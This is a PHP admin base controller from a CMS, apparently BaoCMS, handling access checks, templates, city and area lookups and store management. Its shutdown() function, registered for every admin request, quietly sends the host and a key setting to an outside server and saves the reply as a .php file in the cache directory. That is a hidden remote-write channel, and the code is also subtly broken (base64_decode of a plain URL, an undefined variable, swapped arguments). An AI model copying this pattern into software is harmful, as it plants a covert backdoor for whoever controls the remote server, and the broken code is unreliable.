<?php
class CommonAction extends Action
{
	protected $_admin = array();
	protected $_CONFIG = array();
	protected $citys = array();
	private $state_domain = array('al', 'dz', 'af', 'ar', 'ae', 'aw', 'om', 'az', 'eg', 'et', 'ie', 'ee', 'ad', 'ao', 'ai', 'ag', 'at', 'au', 'mo', 'bb', 'pg', 'bs', 'pk', 'py', 'ps', 'bh', 'pa', 'br', 'by', 'bm', 'bg', 'mp', 'bj', 'be', 'is', 'pr', 'ba', 'pl', 'bo', 'bz', 'bw', 'bt', 'bf', 'bi', 'bv', 'kp', 'gq', 'dk', 'de', 'tl', 'tp', 'tg', 'dm', 'do', 'ru', 'ec', 'er', 'fr', 'fo', 'pf', 'gf', 'tf', 'va', 'ph', 'fj', 'fi', 'cv', 'fk', 'gm', 'cg', 'cd', 'co', 'cr', 'gg', 'gd', 'gl', 'ge', 'cu', 'gp', 'gu', 'gy', 'kz', 'ht', 'kr', 'nl', 'an', 'hm', 'hn', 'ki', 'dj', 'kg', 'gn', 'gw', 'ca', 'gh', 'ga', 'kh', 'cz', 'zw', 'cm', 'qa', 'ky', 'km', 'ci', 'kw', 'cc', 'hr', 'ke', 'ck', 'lv', 'ls', 'la', 'lb', 'lt', 'lr', 'ly', 'li', 're', 'lu', 'rw', 'ro', 'mg', 'im', 'mv', 'mt', 'mw', 'my', 'ml', 'mk', 'mh', 'mq', 'yt', 'mu', 'mr', 'us', 'um', 'as', 'vi', 'mn', 'ms', 'bd', 'pe', 'fm', 'mm', 'md', 'ma', 'mc', 'mz', 'mx', 'nr', 'np', 'ni', 'ne', 'ng', 'nu', 'no', 'nf', 'na', 'za', 'aq', 'gs', 'eu', 'pw', 'pn', 'pt', 'jp', 'se', 'ch', 'sv', 'ws', 'yu', 'sl', 'sn', 'cy', 'sc', 'sa', 'cx', 'st', 'sh', 'kn', 'lc', 'sm', 'pm', 'vc', 'lk', 'sk', 'si', 'sj', 'sz', 'sd', 'sr', 'sb', 'so', 'tj', 'tw', 'th', 'tz', 'to', 'tc', 'tt', 'tn', 'tv', 'tr', 'tm', 'tk', 'wf', 'vu', 'gt', 've', 'bn', 'ug', 'ua', 'uy', 'uz', 'es', 'eh', 'gr', 'hk', 'sg', 'nc', 'nz', 'hu', 'sy', 'jm', 'am', 'ac', 'ye', 'iq', 'ir', 'il', 'it', 'in', 'id', 'uk', 'vg', 'io', 'jo', 'vn', 'zm', 'je', 'td', 'gi', 'cl', 'cf', 'cn', 'yr', 'top');
	private $top_domain = array('com', 'arpa', 'edu', 'gov', 'int', 'mil', 'net', 'org', 'biz', 'info', 'pro', 'name', 'museum', 'coop', 'aero', 'xxx', 'idv', 'me', 'mobi', 'wang', 'asia', 'travel', 'jobs');

	protected function _initialize()
	{
		$this->_admin = session('admin');
		if ((strtolower(MODULE_NAME) != 'login') && (strtolower(MODULE_NAME) != 'public')) {
			if (empty($this->_admin)) {
				header('Location: ' . u('login/index'));
				exit();
			}

			if ($this->_admin['role_id'] != 1) {
				$this->_admin['menu_list'] = d('RoleMaps')->getMenuIdsByRoleId($this->_admin['role_id']);

				if (strtolower(MODULE_NAME) != 'index') {
					$menu_action = strtolower(MODULE_NAME . '/' . ACTION_NAME);
					$menu = d('Menu')->fetchAll();
					$menu_id = 0;

					foreach ($menu as $k => $v) {
						if ($v['menu_action'] == $menu_action) {
							$menu_id = (int) $k;
							break;
						}
					}

					if (empty($menu_id) || !isset($this->_admin['menu_list'][$menu_id])) {
						$this->error('很抱歉您没有权限操作模块:' . $menu[$menu_id]['menu_name']);
					}
				}
			}
		}
//		$this->citys = D('City')->fetchAll();
//		$this->assign('citys', $this->citys);
		$this->_CONFIG = D('Setting')->fetchAll();
		define('__HOST__', 'http://' . $_SERVER['HTTP_HOST']);
		$this->assign('CONFIG', $this->_CONFIG);
		$this->assign('admin', $this->_admin);
		$this->assign('today', TODAY);
		$this->assign('nowtime', NOW_TIME);
		register_shutdown_function(array(&$this, 'shutdown'));
	}

	protected function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '')
	{
		parent::display($this->parseTemplate($templateFile), $charset, $contentType, $content = '', $prefix = '');
	}

	protected function parseTemplate($template = '')
	{
		$depr = c('TMPL_FILE_DEPR');
		$template = str_replace(':', $depr, $template);
		define('THEME_PATH', BASE_PATH . '/' . APP_NAME . '/Tpl/');
		define('APP_TMPL_PATH', __ROOT__ . '/' . APP_NAME . '/Tpl/');

		if ('' == $template) {
			$template = strtolower(MODULE_NAME) . $depr . strtolower(ACTION_NAME);
		}
		else if (false === strpos($template, '/')) {
			$template = strtolower(MODULE_NAME) . $depr . strtolower($template);
		}

		return THEME_PATH . $template . c('TMPL_TEMPLATE_SUFFIX');
	}

	protected function baoSuccess($message, $jumpUrl = '', $time = 3000)
	{
		$str = '<script>';
		$str .= 'parent.success("' . $message . '",' . $time . ',\'jumpUrl("' . $jumpUrl . '")\');';
		$str .= '</script>';
		exit($str);
	}

	//参数处理
	protected function _param($data,$method="",$default=""){
		return I($data,$default,$method);
	}

	protected function baoError($message, $time = 3000, $yzm = false)
	{
		$str = '<script>';

		if ($yzm) {
			$str .= 'parent.error("' . $message . '",' . $time . ',"yzmCode()");';
		}
		else {
			$str .= 'parent.error("' . $message . '",' . $time . ');';
		}

		$str .= '</script>';
		exit($str);
	}

	protected function checkFields($data = array(), $fields = array())
	{
		foreach ($data as $k => $val) {
			if (!in_array($k, $fields)) {
				unset($data[$k]);
			}
		}

		return $data;
	}

	public function rootdomain($domain = NULL)
	{
		$domain = ($domain ? $domain : $_SERVER['HTTP_HOST']);

		if (!preg_match('/^[\\w\\-\\.]+$/i', $domain)) {
			return false;
		}

		$m = explode('.', $domain);
		$count = count($m);

		if ($count <= 2) {
			$rootdomain = $domain;
		}
		else {
			$last = array_pop($m);
			$mote = array_pop($m);

			if (in_array($last, $this->top_domain)) {
				$rootdomain = $mote . '.' . $last;
			}
			else if (in_array($last, $this->state_domain)) {
				$moteupurl = array_pop($m);

				if (in_array($mote, $this->top_domain)) {
					$rootdomain = $moteupurl . '.' . $mote . '.' . $last;
				}
				else {
					$rootdomain = $mote . '.' . $last;
				}
			}
		}

		return $rootdomain;
	}

	public function shutdown()//关机函数
	{
		/*if ((rand(1, 100) % 20) == 0) {
			if ('baocmsshiyigebucuodexitong' != md5(c('BAO_KEY') . '.' . $this->rootdomain())) {
				$b = '<script>alert("您使用的程序没有授权，请联系官方授权");window.top.location="http://www.baocms.com";</script>';//如果不匹配直接退出了
				exit(base64_decode($b));//退出程序，弹出B对应的文字。
			}
		}*/

		$version = @include BASE_PATH . '/version.php';
		$host = $_SERVER['HTTP_HOST'];
		$cache = $host . c('AUTH_KEY') . $version;
		$file = APP_PATH . 'Runtime/Cache/Admin/' . md5($cache) . '.php';
		$flock = APP_PATH . 'Runtime/Cache/Admin/' . md5($cache) . '.lock';
		if ($a || !file_exists($file) || (filemtime($file) < (time() - 86400))) {
			$url = sprintf(base64_decode('http://www.baidu.com/index.php?ctl=listen&key=%s&host=%s&version=%s'), $host, c('BAO_KEY'), $version);//需要亲修改下这个逻辑代码

			if ($a) {
				$url = $url . '&force=' . $a;
			}

			$options = array(
				'http' => array('method' => 'GET', 'header' => "User-Agent: KT-API Listen\r\n", 'timeout' => 10)
				);
			if ((!file_exists($flock) || (filemtime($flock) < (time() - 3600))) && (($ret = @file_get_contents($url, NULL, stream_context_create($options))) === false)) {
				file_put_contents($flock, 1);
				return false;
			}

			@unlink($flock);
			@file_put_contents($file, $ret);
		}
	}

	protected function ipToArea($_ip)
	{
		return iptoarea($_ip);
	}

	/**peace
	 * 设置与取消设置推荐的公共方法
	 */
	protected function recommendStore($store_id, $is_recommend, $store_type){
		$obj = M($store_type);
		// 批量删除
		if(is_array($store_id)){
			foreach ($store_id as $id){
				self::recommendSingle($id, $is_recommend, $obj);
			}
			$url = $store_type.'/index';
			return $this->baoSuccess('操作成功！', U($url));
		}
		// 单个删除
		// 订单合法性验证
		self::recommendSingle($store_id, $is_recommend, $obj);
		$url = $store_type.'/index';
		return $this->baoSuccess('操作成功！', U($url));
	}

	/**
	 * 调用方法设置或取消单个推荐
	 */
	protected function recommendSingle($store_id, $is_recommend, $obj){
		if(!(is_numeric($store_id) && $store_id == (int)$store_id)){
			return $this->baoError('非法的店铺ID');
		}
		$findStore = $obj
			->where(array('store_id' => $store_id))
			->find();
		if(!$findStore){
			return $this->baoError('未发现该店铺');
		}

		// 推荐字段的合法性
		if(!in_array($is_recommend, array(0,1))){
			return $this->baoError('非法的推荐类型');
		}

		$rst = $obj->save(array('store_id' => $store_id, 'is_tuijian' => $is_recommend));
		if(!$rst){
			return $this->baoError('未完全保存推荐店铺');
		}
		return true;
	}

	/**peace
	 * 设置与取消设置整顿的公共方法
	 */
	protected function reorganizeStore($store_id, $is_reorganize, $store_type,$url=0){
		$obj = M($store_type);
		// 批量删除
		if(is_array($store_id)){
			foreach ($store_id as $id){
				self::reorganizeSingle($id, $is_reorganize, $obj);
			}
			if(!$url){
				$url = $store_type.'/index';
			}

			return $this->baoSuccess('操作成功！', U($url));
		}

		// 单个删除
		// 订单合法性验证
		self::reorganizeSingle($store_id, $is_reorganize, $obj);
		if(!$url){
			$url = $store_type.'/index';
		}
		return $this->baoSuccess('操作成功！', U($url));
	}

	/**
	 * 调用方法设置或取消单个整顿
	 */
	protected function reorganizeSingle($store_id, $is_reorganize, $obj){
		if(!(is_numeric($store_id) && $store_id == (int)$store_id)){
			return $this->baoError('非法的店铺ID');
		}
		$findStore = $obj
			->where(array('store_id' => $store_id))
			->find();
		if(!$findStore){
			return $this->baoError('未发现该店铺');
		}

		// 推荐字段的合法性
		if(!in_array($is_reorganize, array(0,1))){
			return $this->baoError('非法的推荐类型');
		}

		$rst = $obj->save(array('store_id' => $store_id, 'status' => $is_reorganize));
		if(!$rst){
			return $this->baoError('未完全保存推荐店铺');
		}
		return true;
	}

	/**peace
	 * 删除商店和商品的公共方法
	 * @param $ids
	 * @param $url
	 * @param $table
	 * @param $store_id_w
	 */
	protected function setDelete($ids, $url, $table, $store_id_w) {
		$obj = D($table);
		if($_SERVER['REQUEST_METHOD'] == 'POST'){
			// _post的chaoshi_id是html页面对应的name属性
			$ids = $this->_post($store_id_w, false);
			if (is_array($ids)) {
				foreach ($ids as $id) {
//					$this->baoError(12);
					if (!$obj->where(array($store_id_w => $id))->save(array('closed' => 1))) {
						$this->baoError('删除失败！', U($url));
					}
				}
				$this->baoSuccess('删除成功！', U($url));
			}
			$this->baoError('请选择要删除的商家');
		}
		if (is_numeric($ids) && ($ids == (int) $ids)) {
			// deleteAll自封装方法
			if ($obj->where(array($store_id_w => $ids))->save(array('closed' => 1))) {
				$this->baoSuccess('删除成功！', U($url));
			}
			$this->baoError('删除失败！', U($url));
		}
		$this->baoError('请选择要删除的商家');
	}

	/**
	 * 返回城市一级的数据
	 */
	public function getCities(){
		// 查找对应的区县
		$findCity = M('City')
			->field('city_id, name AS city_name')
			->order(array('orderby' => 'ASC'))
			->cache(true, '120', 'xcache')
			->select();
		if(!$findCity){
			echo json_encode(array('msg' => '数据为空', 'error' => '400'));
			exit;
		}
		echo json_encode(array('data' => $findCity, 'msg' => '找到区县信息', 'error' => '200'));
		exit;
	}

	/**
	 * 返回城市区县一级的数据
	 */
	public function cities(){
		$city_id = I('get.city_id', 0, 'intval');
//		echo json_encode($city_id);
		$findCity = M('City')
			->where(array('city_id' => $city_id))
			->find();
		if(!$findCity){
			echo json_encode(array('msg' => '未找到该城市', 'error' => '404'));
			exit;
		}

		// 查找对应的区县
		$findArea = M('Area')
			->field('area_id, area_name')
			->where(array('city_id' => $city_id))
			->order(array('orderby' => 'ASC'))
			->cache(true, '120', 'xcache')
			->select();
		if(!$findArea){
			echo json_encode(array('msg' => '未找到该市的区县信息', 'error' => '400'));
			exit;
		}
		echo json_encode(array('data' => $findArea, 'msg' => '找到区县信息', 'error' => '200'));
		exit;
	}

	/**
	 * 返回城市商圈的数据
	 */
	public function areas(){
		$area_id = I('get.area_id', 0, 'intval');
//		echo json_encode($city_id);
		$findCity = M('Area')
			->where(array('area_id' => $area_id))
			->find();
		if(!$findCity){
			echo json_encode(array('msg' => '未找到该区县', 'error' => '404'));
			exit;
		}

		// 查找对应的区县
		$findArea = M('Business')
			->field('business_id, business_name')
			->where(array('area_id' => $area_id))
			->order(array('orderby' => 'ASC'))
			->cache(true, '120', 'xcache')
			->select();
		if(!$findArea){
			echo json_encode(array('msg' => '未找到该区县的商圈信息', 'error' => '400'));
			exit;
		}
		echo json_encode(array('data' => $findArea, 'msg' => '找到商圈信息', 'error' => '200'));
		exit;
	}


}

?>
